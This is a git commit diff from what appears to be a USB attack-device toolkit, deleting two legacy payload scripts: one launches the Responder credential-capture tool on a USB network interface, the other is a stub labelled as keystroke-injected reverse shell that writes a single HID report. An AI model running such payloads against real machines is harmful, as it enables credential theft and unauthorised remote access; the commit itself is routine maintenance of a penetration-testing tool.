a05aee54c31cb18c7349a36fdbee43faa4b6c85a
quasialex <19363009+quasialex@users.noreply.github.com>
2025-08-16 12:53:32 +0200

    cleanup: remove legacy payloads; improve install.sh and p4wnctl.py

--- payloads/network/run_responder.sh
+++
@@ -1,4 +0,0 @@
-#!/bin/bash
-# Launches Responder on usb0 interface
-cd /opt/Responder
-sudo python3 Responder.py -I usb0 -wrf
--- payloads/reverse_shell.sh
+++
@@ -1,6 +0,0 @@
-#!/bin/bash
-# Inject reverse shell as keystrokes
-
-echo -ne '\0\0\x0f\0\0\0\0\0' > /dev/hidg0  # Press 'r'
-sleep 0.1
-# Add more HID injection here...
